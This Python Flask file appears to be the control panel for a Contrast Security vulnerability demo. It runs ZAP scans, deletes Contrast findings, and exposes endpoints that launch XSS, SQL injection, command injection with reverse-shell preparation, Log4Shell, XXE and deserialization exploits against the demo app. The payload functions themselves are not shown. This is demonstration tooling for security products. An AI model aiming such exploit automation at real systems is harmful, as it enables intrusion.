from time import sleep
import time
from flask import Flask, jsonify, render_template, request
import requests
import logging
import sys
import threading
import datetime
import os
import zipfile
import io
import json
import base64
import re
from typing import Dict, Optional
from kubernetes import client, config



########################################
# setup
########################################
app = Flask(__name__)
# Configure logging to output to stdout
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

# Load in-cluster config (only works inside Kubernetes)
try:
    config.load_incluster_config()
    v1 = client.CoreV1Api()
    k8s_namespace = os.getenv("NAMESPACE", "default")
    logger.info(f"Kubernetes client initialized for namespace: {k8s_namespace}")
except Exception as e:
    logger.warning(f"Kubernetes client not initialized: {str(e)}")
    v1 = None


# Parse Contrast API token function
def parse_contrast_token(token: str) -> Optional[Dict[str, str]]:
    """
    Parse Contrast API token and extract org ID and base URL.
    Token format: {"api_key": "...", "service_key": "...", "url": "...", "user_name": "agent_<org_id>@<domain>" or "agent_<org_id>_<domain>"}
    """
    try:
        # Decode base64 token
        decoded_bytes = base64.b64decode(token)
        decoded_str = decoded_bytes.decode('utf-8')
        token_data = json.loads(decoded_str)
        
        # Extract base URL
        base_url = token_data.get('url', '')
        if not base_url:
            logger.error("No 'url' field found in token")
            return None
        
        # Clean up the URL:
        # 1. Remove "agents" from subdomain (e.g., security-research-agents -> security-research)
        # 2. Remove "/Contrast" from the end
        cleaned_url = base_url
        
        # Remove "/Contrast" from the end
        if cleaned_url.endswith('/Contrast'):
            cleaned_url = cleaned_url[:-9]  # Remove "/Contrast"
        
        # Remove "agents" from subdomain
        cleaned_url = cleaned_url.replace('-agents.', '.')
        
        logger.info(f"Original URL: {base_url}")
        logger.info(f"Cleaned URL: {cleaned_url}")
            
        # Extract user_name
        user_name = token_data.get('user_name', '')
        
        # Parse org ID from user_name using regex
        # Format: agent_<org_id>@<domain> or agent_<org_id>_<domain>
        match = re.search(r'agent_([a-f0-9-]+)[@_]', user_name)
        if match:
            org_id = match.group(1)
            logger.info(f"Parsed organization ID: {org_id}")
            return {
                'org_id': org_id,
                'base_url': cleaned_url
            }
        else:
            logger.error(f"Could not parse org ID from user_name: {user_name}")
            return None
            
    except Exception as e:
        logger.error(f"Error parsing token: {e}")
        return None

# Global variables for Contrast API information
contrast_org_id = ''
contrast_base_url = ''
contrast_api_key = ''
contrast_api_authorization = ''

# Try to get Contrast API token from environment - do this only once at startup
contrast_api_token = os.getenv('CONTRAST__AGENT__TOKEN', '')
contrast_api_key = os.getenv('CONTRAST__API__KEY', '')
contrast_api_authorization = os.getenv('CONTRAST__API__AUTHORIZATION', '')

if contrast_api_token:
    try:
        token_info = parse_contrast_token(contrast_api_token)
        if token_info:
            contrast_org_id = token_info['org_id']
            contrast_base_url = token_info['base_url']
            logger.info(f"Successfully parsed Contrast API token. Org ID: {contrast_org_id}, Base URL: {contrast_base_url}")
        else:
            logger.warning("Failed to parse Contrast API token")
    except Exception as e:
        logger.error(f"Error processing Contrast API token: {e}")

# Log API credentials status (without exposing sensitive values)
if contrast_api_key:
    logger.info(f"Contrast API key loaded (length: {len(contrast_api_key)})")
else:
    logger.warning("Contrast API key not found in environment")

if contrast_api_authorization:
    logger.info(f"Contrast API authorization loaded (length: {len(contrast_api_authorization)})")
else:
    logger.warning("Contrast API authorization not found in environment")

zap_url = "http://zapproxy:80"
first_run = True
scan_running = False
stop_scan_flag = False
scan_state = "idle"  # idle, loading_context, spider, ajax_spider, active_scan, finished, error
scan_output_buffer = []
exploit_running = False
stop_exploit_flag = False
exploit_state = "idle"  # idle, starting, running, finished, error
exploit_output_buffer = []
traffic_running = False
stop_traffic_flag = False
traffic_state = "idle"  # idle, starting, running, finished, error
traffic_output_buffer = []


########################################
# routes
########################################
@app.route('/')
def hello_world():
    # Use the global variables that were set during startup
    global contrast_org_id, contrast_base_url
    
    # Get CONTRAST__UNIQ__NAME from environment
    contrast_uniq_name = os.getenv('CONTRAST__UNIQ__NAME', '')
    
    # Format the contrast URL with org ID and uniq name if available
    formatted_contrast_url = ''
    if contrast_org_id and contrast_uniq_name and contrast_base_url:
        formatted_contrast_url = f"{contrast_base_url}/Contrast/cs/index.html#/{contrast_org_id}/explorer?search={contrast_uniq_name}-contrast-cargo-cats"
    
    return render_template('index.html', 
                           contrast_url=formatted_contrast_url,
                           contrast_org_id=contrast_org_id,
                           contrast_uniq_name=contrast_uniq_name)

@app.route("/deployment/health")
def health_check():
    if not v1:
        return jsonify({"healthy": False, "message": "Kubernetes client not initialized"}), 500

    try:
        pods = v1.list_namespaced_pod(namespace=k8s_namespace)
        pod_statuses = []

        for pod in pods.items:
            containers = pod.status.container_statuses or []
            is_ready = all(c.ready for c in containers)

            pod_statuses.append({
                "name": pod.metadata.name,
                "phase": pod.status.phase,
                "ready": is_ready 
            })

        healthy = all(p["ready"] for p in pod_statuses)

        return jsonify({
            "healthy": healthy,
            "pods": pod_statuses
        }), 200 if healthy else 503

    except Exception as e:
        return jsonify({"healthy": False, "message": str(e)}), 500


@app.route('/zap/health')
def check_zap_health():
    global zap_url
    try:
        response = requests.get(f"{zap_url}/JSON/core/view/version/", timeout=5)
        
        if response.status_code == 200:
            zap_info = response.json()
            logger.info(f"ZAP proxy is alive: {zap_info}")
            return jsonify({
                "status": "alive",
                "message": "ZAP proxy is responding",
                "zap_version": zap_info.get("version", "unknown"),
                "url": zap_url
            }), 200
        else:
            logger.warning(f"ZAP proxy returned status code: {response.status_code}")
            return jsonify({
                "status": "error",
                "message": f"ZAP proxy responded with status code {response.status_code}",
                "url": zap_url
            }), 503
    except Exception as e:
        logger.error(f"Error checking ZAP proxy: {str(e)}")
        return jsonify({
            "status": "error",
            "message": f"Unexpected error: {str(e)}",
            "url": zap_url
        }), 500

@app.route('/zap/scan/start')
def zap_scan():
    global stop_scan_flag, scan_running, scan_state
    
    if scan_running:
        return jsonify({"status": "error", "message": "Scan already running"}), 400
    
    # Check if ZAP is healthy before starting scan
    try:
        logger.info("Checking ZAP health before starting scan")
        response = requests.get(f"{zap_url}/JSON/core/view/version/", timeout=5)
        if response.status_code != 200:
            logger.error(f"ZAP health check failed with status code: {response.status_code}")
            return jsonify({"status": "error", "message": "ZAP is not responding"}), 503
        logger.info("ZAP health check passed")
    except Exception as e:
        logger.error(f"ZAP health check failed: {str(e)}")
        return jsonify({"status": "error", "message": "ZAP is not responding"}), 503
    
    stop_scan_flag = False
    scan_state = "starting"
    thread = threading.Thread(target=scan)
    thread.start()
    return jsonify({"status": "success", "message": "Scan started in background"}), 200

@app.route('/zap/scan/stop')
def zap_scan_stop():
    global stop_scan_flag, scan_state, zap_url
    stop_scan_flag = True
    if scan_state != "idle":
        scan_state = "stopping"
        
    # Call ZAP API to actually stop all active scans
    try:
        response = requests.get(f"{zap_url}/JSON/ascan/action/stopAllScans/", timeout=5)
        if response.status_code == 200:
            log_scan_output("Successfully called ZAP API to stop all active scans")
        else:
            log_scan_output(f"ZAP API call to stop active scans failed with status code: {response.status_code}", "WARNING")
    except Exception as e:
        log_scan_output(f"Error calling ZAP API to stop active scans: {str(e)}", "ERROR")
    
    # Call ZAP API to stop AJAX spider
    try:
        response = requests.get(f"{zap_url}/JSON/ajaxSpider/action/stop/", timeout=5)
        if response.status_code == 200:
            log_scan_output("Successfully called ZAP API to stop AJAX spider")
        else:
            log_scan_output(f"ZAP API call to stop AJAX spider failed with status code: {response.status_code}", "WARNING")
    except Exception as e:
        log_scan_output(f"Error calling ZAP API to stop AJAX spider: {str(e)}", "ERROR")
    
    # Call ZAP API to stop regular spiders
    try:
        response = requests.get(f"{zap_url}/JSON/spider/action/stopAllScans/", timeout=5)
        if response.status_code == 200:
            log_scan_output("Successfully called ZAP API to stop all spider scans")
        else:
            log_scan_output(f"ZAP API call to stop spider scans failed with status code: {response.status_code}", "WARNING")
    except Exception as e:
        log_scan_output(f"Error calling ZAP API to stop spider scans: {str(e)}", "ERROR")
        
    return jsonify({"status": "success", "message": "Scan stop requested"}), 200

@app.route('/zap/scan/status')
def zap_scan_status():
    global scan_running, scan_state, scan_output_buffer
    return jsonify({
        "status": "running" if scan_running else "idle",
        "scan_state": scan_state,
        "output": scan_output_buffer,  # Return all entries
        "message": f"Scan is currently {scan_state}" if scan_running else "No scan is currently running"
    }), 200

@app.route('/zap/scan/clear')
def zap_scan_clear():
    global scan_output_buffer
    scan_output_buffer = []
    return jsonify({"status": "success", "message": "Scan output buffer cleared"}), 200

@app.route('/exploit/start')
def start_exploit():
    global exploit_running, exploit_state, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    stop_exploit_flag = False
    exploit_state = "starting"
    thread = threading.Thread(target=exploit)
    thread.start()
    return jsonify({"status": "success", "message": "Exploit started in background"}), 200

@app.route('/exploit/stop')
def stop_exploit():
    global stop_exploit_flag, exploit_state
    stop_exploit_flag = True
    if exploit_state != "idle":
        exploit_state = "stopping"
    return jsonify({"status": "success", "message": "Exploit stop requested"}), 200

@app.route('/exploit/status')
def exploit_status():
    global exploit_running, exploit_state, exploit_output_buffer
    return jsonify({
        "status": "running" if exploit_running else "idle",
        "exploit_state": exploit_state,
        "output": exploit_output_buffer,
        "message": f"Exploit is currently {exploit_running}" if exploit_running else "No exploit is currently running"
    }), 200

@app.route('/exploit/clear')
def exploit_clear():
    global exploit_output_buffer
    exploit_output_buffer = []
    return jsonify({"status": "success", "message": "Exploit output buffer cleared"}), 200

@app.route('/exploit/xss')
def exploit_xss():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    exploit_running = True
    exploit_state = "xss_exploit"
    
    try:
        session = requests.Session()
        # Login first
        login_result = run_login_exploit(session)
        if not login_result:
            log_exploit_output("Login failed - cannot proceed with XSS exploit", "ERROR")
            return jsonify({"status": "error", "message": "Login failed - cannot proceed with XSS exploit"}), 500
        
        result = run_xss_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"XSS exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "XSS exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"XSS exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"XSS exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False

@app.route('/exploit/login')
def exploit_login():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    exploit_running = True
    exploit_state = "login"
    
    try:
        session = requests.Session()
        result = run_login_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"Login exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "Login exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"Login exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"Login exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False

@app.route('/exploit/command-injection')
def exploit_command_injection():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    exploit_running = True
    exploit_state = "cmd_injection"
    
    try:
        session = requests.Session()
        # Login first
        login_result = run_login_exploit(session)
        if not login_result:
            log_exploit_output("Login failed - cannot proceed with command injection exploit", "ERROR")
            return jsonify({"status": "error", "message": "Login failed - cannot proceed with command injection exploit"}), 500
        
        result = run_command_injection_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"Command injection exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "Command injection exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"Command injection exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"Command injection exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False

@app.route('/exploit/path-traversal')
def exploit_path_traversal():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    exploit_running = True
    exploit_state = "path_traversal"
    
    try:
        session = requests.Session()
        # Login first
        login_result = run_login_exploit(session)
        if not login_result:
            log_exploit_output("Login failed - cannot proceed with path traversal exploit", "ERROR")
            return jsonify({"status": "error", "message": "Login failed - cannot proceed with path traversal exploit"}), 500
        
        result = run_path_traversal_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"Path traversal exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "Path traversal exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"Path traversal exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"Path traversal exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False

@app.route('/exploit/sql-injection')
def exploit_sql_injection():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    exploit_running = True
    exploit_state = "sql_injection"
    
    try:
        session = requests.Session()
        # Login first
        login_result = run_login_exploit(session)
        if not login_result:
            log_exploit_output("Login failed - cannot proceed with SQL injection exploit", "ERROR")
            return jsonify({"status": "error", "message": "Login failed - cannot proceed with SQL injection exploit"}), 500
        
        result = run_sql_injection_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"SQL injection exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "SQL injection exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"SQL injection exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"SQL injection exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False

@app.route('/exploit/log4shell')
def exploit_log4shell():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    exploit_running = True
    exploit_state = "log4shell"
    
    try:
        session = requests.Session()
        # Login first
        login_result = run_login_exploit(session)
        if not login_result:
            log_exploit_output("Login failed - cannot proceed with Log4Shell exploit", "ERROR")
            return jsonify({"status": "error", "message": "Login failed - cannot proceed with Log4Shell exploit"}), 500
        
        result = run_log4shell_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"Log4Shell exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "Log4Shell exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"Log4Shell exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"Log4Shell exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False

@app.route('/exploit/ssjs-injection')
def exploit_ssjs_injection():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    exploit_running = True
    exploit_state = "ssjs_injection"
    
    try:
        session = requests.Session()
        # Login first
        login_result = run_login_exploit(session)
        if not login_result:
            log_exploit_output("Login failed - cannot proceed with SSJS injection exploit", "ERROR")
            return jsonify({"status": "error", "message": "Login failed - cannot proceed with SSJS injection exploit"}), 500
        
        result = run_ssjs_injection_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"SSJS injection exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "SSJS injection exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"SSJS injection exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"SSJS injection exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False

@app.route('/exploit/xxe')
def exploit_xxe():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    exploit_running = True
    exploit_state = "xxe_exploit"
    
    try:
        session = requests.Session()
        # Login first
        login_result = run_login_exploit(session)
        if not login_result:
            log_exploit_output("Login failed - cannot proceed with XXE exploit", "ERROR")
            return jsonify({"status": "error", "message": "Login failed - cannot proceed with XXE exploit"}), 500
        
        result = run_xxe_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"XXE exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "XXE exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"XXE exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"XXE exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False
        
@app.route('/exploit/deserialization')
def exploit_deserialization():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400
    
    exploit_running = True
    exploit_state = "deserialization_exploit"
    
    try:
        session = requests.Session()
        # Login first
        login_result = run_login_exploit(session)
        if not login_result:
            log_exploit_output("Login failed - cannot proceed with deserialization exploit", "ERROR")
            return jsonify({"status": "error", "message": "Login failed - cannot proceed with deserialization exploit"}), 500
        
        result = run_deserialization_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"Deserialization exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "Deserialization exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"Deserialization exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"Deserialization exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False

@app.route('/exploit/list')
def exploit_list():
    """List all available individual exploits"""
    exploits = [
        {"name": "XSS", "endpoint": "/exploit/xss", "description": "Cross-Site Scripting exploit"},
        {"name": "Login", "endpoint": "/exploit/login", "description": "Default credential login exploit"},
        {"name": "Command Injection", "endpoint": "/exploit/command-injection", "description": "OS command injection exploit including reverse shell preparation"},
        {"name": "Path Traversal", "endpoint": "/exploit/path-traversal", "description": "Directory traversal exploit"},
        {"name": "SQL Injection", "endpoint": "/exploit/sql-injection", "description": "SQL injection exploit"},
        {"name": "Log4Shell", "endpoint": "/exploit/log4shell", "description": "Log4j JNDI injection exploit"},
        {"name": "SSJS Injection", "endpoint": "/exploit/ssjs-injection", "description": "Server-side JavaScript injection"},
        {"name": "XXE", "endpoint": "/exploit/xxe", "description": "XML External Entity injection"},
        {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"}
    ]
    
    return jsonify({
        "status": "success", 
        "message": "Available individual exploits",
        "exploits": exploits
    }), 200

@app.route('/traffic/start')
def start_traffic():
    global traffic_running, traffic_state, stop_traffic_flag
    
    if traffic_running:
        return jsonify({"status": "error", "message": "Traffic generation already running"}), 400
    
    stop_traffic_flag = False
    traffic_state = "starting"
    thread = threading.Thread(target=traffic)
    thread.start()
    return jsonify({"status": "success", "message": "Traffic generation started in background"}), 200

@app.route('/traffic/stop')
def stop_traffic():
    global stop_traffic_flag, traffic_state
    stop_traffic_flag = True
    if traffic_state != "idle":
        traffic_state = "stopping"
    return jsonify({"status": "success", "message": "Traffic generation stop requested"}), 200

@app.route('/traffic/status')
def traffic_status():
    global traffic_running, traffic_state, traffic_output_buffer
    return jsonify({
        "status": "running" if traffic_running else "idle",
        "traffic_state": traffic_state,
        "output": traffic_output_buffer,
        "message": f"Traffic generation is currently {traffic_state}" if traffic_running else "No traffic generation is currently running"
    }), 200

@app.route('/traffic/clear')
def traffic_clear():
    global traffic_output_buffer
    traffic_output_buffer = []
    return jsonify({"status": "success", "message": "Traffic output buffer cleared"}), 200

########################################
# delete endpoints
########################################

@app.route('/delete/all', methods=['POST'])
def delete_all():
    """Delete all incidents and issues for applications starting with the contrast unique name"""
    try:
        logger.info("Delete all incidents/issues requested")
        
        # Check if we have the required credentials and configuration
        if not contrast_api_key or not contrast_api_authorization or not contrast_org_id or not contrast_base_url:
            logger.error("Missing Contrast API credentials or configuration")
            return jsonify({
                "status": "error", 
                "message": "Missing Contrast API credentials or configuration"
            }), 500
        
        # Get the contrast unique name from environment
        contrast_uniq_name = os.getenv('CONTRAST__UNIQ__NAME', '')
        if not contrast_uniq_name:
            logger.error("CONTRAST__UNIQ__NAME environment variable not found")
            return jsonify({
                "status": "error", 
                "message": "Contrast unique name not configured"
            }), 500
        
        logger.info(f"Filtering applications by unique name: {contrast_uniq_name}")
        
        # Filter by unique name plus "-contrast-cargo-cats" suffix
        filter_name = f"{contrast_uniq_name}-contrast-cargo-cats"
        logger.info(f"Using filter name: {filter_name}")
        
        applications_url = f"{contrast_base_url}/Contrast/api/ng/{contrast_org_id}/applications/filter?includeMerged=true"
        headers = {
            'Authorization': contrast_api_authorization,
            'API-Key': contrast_api_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        
        request_body = {
            "filterText": filter_name,
        }
        
        response = requests.post(applications_url, headers=headers, json=request_body, timeout=30)
        
        if response.status_code != 200:
            logger.error(f"Failed to fetch applications: {response.status_code} - {response.text}")
            return jsonify({
                "status": "error", 
                "message": f"Failed to fetch applications: API returned status {response.status_code}"
            }), response.status_code
        
        applications_data = response.json()
        applications = applications_data.get('applications', []) if isinstance(applications_data, dict) else applications_data
        
        if not applications:
            logger.info("No applications found matching the unique name filter")
            return jsonify({
                "status": "success", 
                "message": f"No applications found starting with '{filter_name}'"
            }), 200
        
        app_ids = [app.get('app_id', 'Unknown') for app in applications]
        
        deletion_results = []
        headers = {
            'Authorization': contrast_api_authorization,
            'API-Key': contrast_api_key,
            'Content-Type': 'application/json'
        }
        
        for app_id in app_ids:
            if app_id == 'Unknown':
                logger.warning("Skipping application with unknown app_id")
                deletion_results.append({
                    "app_id": app_id,
                    "status": "skipped",
                    "message": "Unknown app_id"
                })
                continue
            
            issues_url = f"{contrast_base_url}/api/ns-ui/v1/organizations/{contrast_org_id}/issues"
            
            try:
                issues_response = requests.delete(
                    issues_url, 
                    headers=headers, 
                    params={"applicationId": app_id},
                    timeout=30
                )
                
                if issues_response.status_code in [200, 202, 204]:
                    deletion_results.append({
                        "app_id": app_id,
                        "status": "success",
                        "message": "Issues deleted successfully"
                    })
                elif issues_response.status_code == 404:
                    deletion_results.append({
                        "app_id": app_id,
                        "status": "success",
                        "message": "No issues found to delete"
                    })
                else:
                    logger.error(f"Failed to delete issues for application {app_id}: {issues_response.status_code}")
                    deletion_results.append({
                        "app_id": app_id,
                        "status": "error",
                        "message": f"Failed to delete issues: API returned status {issues_response.status_code}"
                    })
                    
            except Exception as e:
                logger.error(f"Error while deleting issues for application {app_id}: {str(e)}")
                deletion_results.append({
                    "app_id": app_id,
                    "status": "error",
                    "message": f"Error: {str(e)}"
                })
        
        successful_deletions = len([r for r in deletion_results if r["status"] == "success"])
        failed_deletions = len([r for r in deletion_results if r["status"] == "error"])
        
        return jsonify({
            "status": "success", 
            "message": f"Processed {len(applications)} applications: {successful_deletions} successful deletions, {failed_deletions} failed",
            "application_ids": app_ids,
            "count": len(applications),
            "deletion_results": deletion_results,
            "summary": {
                "successful": successful_deletions,
                "failed": failed_deletions,
                "total": len(deletion_results)
            }
        }), 200
        
    except Exception as e:
        logger.error(f"Error in delete all operation: {str(e)}")
        return jsonify({
            "status": "error", 
            "message": f"Failed to delete all incidents/issues: {str(e)}"
        }), 500

@app.route('/delete/incident', methods=['POST'])
def delete_incident():
    """Delete a specific incident by ID"""
    try:
        data = request.get_json()
        incident_id = data.get('incidentId') if data else None
        
        if not incident_id:
            return jsonify({
                "status": "error", 
                "message": "Incident ID is required"
            }), 400
        
        logger.info(f"Delete incident requested for ID: {incident_id}")
        
        if not contrast_api_key or not contrast_api_authorization or not contrast_org_id or not contrast_base_url:
            logger.error("Missing Contrast API credentials or configuration")
            return jsonify({
                "status": "error", 
                "message": "Missing Contrast API credentials or configuration"
            }), 500
        
        api_url = f"{contrast_base_url}/api/ns-ui/v1/organizations/{contrast_org_id}/incidents/{incident_id}"
        headers = {
            'Authorization': contrast_api_authorization,
            'API-Key': contrast_api_key,
            'Content-Type': 'application/json'
        }
        
        response = requests.delete(api_url, headers=headers, timeout=30)
        
        if response.status_code == 200 or response.status_code == 204:
            logger.info(f"Successfully deleted incident: {incident_id}")
            return jsonify({
                "status": "success", 
                "message": f"Incident {incident_id} has been deleted successfully"
            }), 200
        elif response.status_code == 404:
            logger.warning(f"Incident not found: {incident_id}")
            return jsonify({
                "status": "error", 
                "message": f"Incident {incident_id} not found"
            }), 404
        else:
            logger.error(f"Contrast API returned error: {response.status_code} - {response.text}")
            return jsonify({
                "status": "error", 
                "message": f"Failed to delete incident: API returned status {response.status_code}"
            }), response.status_code
        
    except Exception as e:
        logger.error(f"Error deleting incident: {str(e)}")
        return jsonify({
            "status": "error", 
            "message": f"Failed to delete incident: {str(e)}"
        }), 500

@app.route('/delete/issue', methods=['POST'])
def delete_issue():
    """Delete a specific issue by ID"""
    try:
        data = request.get_json()
        issue_id = data.get('issueId') if data else None
        
        if not issue_id:
            return jsonify({
                "status": "error", 
                "message": "Issue ID is required"
            }), 400
        
        logger.info(f"Delete issue requested for ID: {issue_id}")
        
        if not contrast_api_key or not contrast_api_authorization or not contrast_org_id or not contrast_base_url:
            logger.error("Missing Contrast API credentials or configuration")
            return jsonify({
                "status": "error", 
                "message": "Missing Contrast API credentials or configuration"
            }), 500
        
        api_url = f"{contrast_base_url}/api/ns-ui/v1/organizations/{contrast_org_id}/issues/{issue_id}"
        headers = {
            'Authorization': contrast_api_authorization,
            'API-Key': contrast_api_key,
            'Content-Type': 'application/json'
        }
        
        response = requests.delete(api_url, headers=headers, timeout=30)
        
        if response.status_code == 200 or response.status_code == 204:
            logger.info(f"Successfully deleted issue: {issue_id}")
            return jsonify({
                "status": "success", 
                "message": f"Issue {issue_id} has been deleted successfully"
            }), 200
        elif response.status_code == 404:
            logger.warning(f"Issue not found: {issue_id}")
            return jsonify({
                "status": "error", 
                "message": f"Issue {issue_id} not found"
            }), 404
        else:
            logger.error(f"Contrast API returned error: {response.status_code} - {response.text}")
            return jsonify({
                "status": "error", 
                "message": f"Failed to delete issue: API returned status {response.status_code}"
            }), response.status_code
        
    except Exception as e:
        logger.error(f"Error deleting issue: {str(e)}")
        return jsonify({
            "status": "error", 
            "message": f"Failed to delete issue: {str(e)}"
        }), 500

@app.route('/delete/application', methods=['POST'])
def delete_application():
    """Delete all incidents and issues for a specific application by application name"""
    try:
        data = request.get_json()
        app_name = data.get('applicationName') if data else None
        
        if not app_name:
            return jsonify({
                "status": "error", 
                "message": "Application name is required"
            }), 400
        
        logger.info(f"Delete application incidents/issues requested for app name: {app_name}")
        
        # Check if we have the required credentials and configuration
        if not contrast_api_key or not contrast_api_authorization or not contrast_org_id or not contrast_base_url:
            logger.error("Missing Contrast API credentials or configuration")
            return jsonify({
                "status": "error", 
                "message": "Missing Contrast API credentials or configuration"
            }), 500
        
        headers = {
            'Authorization': contrast_api_authorization,
            'API-Key': contrast_api_key,
            'Content-Type': 'application/json'
        }
        
        # Delete issues for the specific application using application name
        issues_url = f"{contrast_base_url}/api/ns-ui/v1/organizations/{contrast_org_id}/issues"
        
        try:
            issues_response = requests.delete(
                issues_url, 
                headers=headers, 
                params={"applicationName": app_name},
                timeout=30
            )
            
            if issues_response.status_code in [200, 202, 204]:
                logger.info(f"Successfully deleted issues for application: {app_name}")
                return jsonify({
                    "status": "success", 
                    "message": f"Successfully deleted all incidents and issues for application '{app_name}'"
                }), 200
            elif issues_response.status_code == 404:
                logger.warning(f"No issues found for application: {app_name}")
                return jsonify({
                    "status": "success", 
                    "message": f"No issues found for application '{app_name}' (already clean)"
                }), 200
            else:
                logger.error(f"Contrast API returned error: {issues_response.status_code} - {issues_response.text}")
                return jsonify({
                    "status": "error", 
                    "message": f"Contrast API returned error: {issues_response.status_code}"
                }), issues_response.status_code
        
        except Exception as e:
            logger.error(f"Error deleting issues for application {app_name}: {str(e)}")
            return jsonify({
                "status": "error", 
                "message": f"Error deleting issues for application {app_name}: {str(e)}"
            }), 500
        
    except Exception as e:
        logger.error(f"Error in delete application operation: {str(e)}")
        return jsonify({
            "status": "error", 
            "message": f"Failed to delete application incidents/issues: {str(e)}"
        }), 500



########################################
# output logging and stop check helpers
########################################
def log_scan_output(message, level="INFO"):
    """Helper function to log and buffer scan output"""
    global scan_output_buffer
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Format as a single line string
    log_line = f"[{timestamp}] {level}: {message}"
    
    scan_output_buffer.append(log_line)
    
    # Also log to the regular logger
    if level == "ERROR":
        logger.error(message)
    elif level == "WARNING":
        logger.warning(message)
    else:
        logger.info(message)

def log_exploit_output(message, level="INFO"):
    """Helper function to log and buffer exploit output"""
    global exploit_output_buffer
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Format as a single line string
    log_line = f"[{timestamp}] {level}: {message}"
    
    exploit_output_buffer.append(log_line)
    
    # Also log to the regular logger
    if level == "ERROR":
        logger.error(message)
    elif level == "WARNING":
        logger.warning(message)
    else:
        logger.info(message)

def log_traffic_output(message, level="INFO"):
    """Helper function to log and buffer traffic output"""
    global traffic_output_buffer
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Format as a single line string
    log_line = f"[{timestamp}] {level}: {message}"
    
    traffic_output_buffer.append(log_line)
    
    # Also log to the regular logger
    if level == "ERROR":
        logger.error(message)
    elif level == "WARNING":
        logger.warning(message)
    else:
        logger.info(message)

def check_exploit_stop(phase_name):
    """Helper function to check if exploit should stop and handle cleanup"""
    global stop_exploit_flag, exploit_running, exploit_state
    
    if stop_exploit_flag:
        log_exploit_output(f"Exploit stopped during {phase_name} phase", "WARNING")
        exploit_running = False
        exploit_state = "stopped"
        return True
    return False

def check_scan_stop(phase_name):
    """Helper function to check if scan should stop and handle cleanup"""
